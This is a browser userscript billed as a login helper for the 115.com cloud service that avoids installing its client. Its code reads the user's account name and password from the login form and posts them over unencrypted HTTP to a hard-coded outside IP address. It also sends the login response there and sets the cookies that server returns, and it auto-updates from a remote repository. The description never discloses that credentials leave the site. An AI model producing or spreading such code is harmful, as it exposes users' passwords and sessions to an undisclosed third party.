// ==UserScript==
// @name         115登录助手
// @namespace    no
// @version      0.2
// @description  不用安装客户端了~
// @author       space
// @include      http://115.com/*
// @grant        none
// @downloadURL  https://coding.net/u/imspace/p/m115p/git/raw/master/script.user.js
// @updateURL    https://coding.net/u/imspace/p/m115p/git/raw/master/script.user.js
// ==/UserScript==
'use strict';

//$.getScript('https://coding.net/u/imspace/p/m115p/git/raw/master/ref.js');

$('a[lgb-nav="login"]').click()
$('div[lg_rel="download"]').hide()
$('div[lg_rel="login"]').show()
window.my115Server="http://139.129.47.212:3000/";
var browserInterface = {
	LoginEncrypt: function LoginEncrypt(env, callback) {
		var server = (typeof my115Server)=='undefined'? 'http://192.168.31.110:3000/': my115Server;
		var rTime;
		function processDec(r) {
			json = $.parseJSON(r.responseText);
			if (!json.state) {
				window[callback](r.responseText);
			} else {
				console.log('ok');
				$.post(server, {body: json.data,time: rTime})
				.success(function (r) {
					var cookie = $.parseJSON(r.body).cookie;
					var d = new Date();
					d.setTime(d.getTime() + (7*24*60*60*1000));
					for (var i in cookie) if ( cookie.hasOwnProperty(i) ) {
						document.cookie = (i+'='+escape(cookie[i])+';expires='+d.toUTCString()+';domain='+'.115.com');
					}
					console.log('done');
					location.reload();
				});
			}
		}
		var dat = {
			account: $('#js-account').val(),
			passwd: $('#js-passwd').val()
		};
		if (env.hasOwnProperty('country')) {
			dat['country'] = env['country'];
		}
		$.post(server, dat)
		.success(function (r) {
			console.log(r);
			rTime = r.time;
			var settings = {
				url: oofUtil.paths.PASSPORT + '/?'+$.param(r.headers),
				cache: false,
				type: 'POST',
				data: {data: r.body, goto: ''},
				complete: processDec
			};
			oofUtil.bridge.passport(settings);
		});
	}
};
window.browserInterface = browserInterface;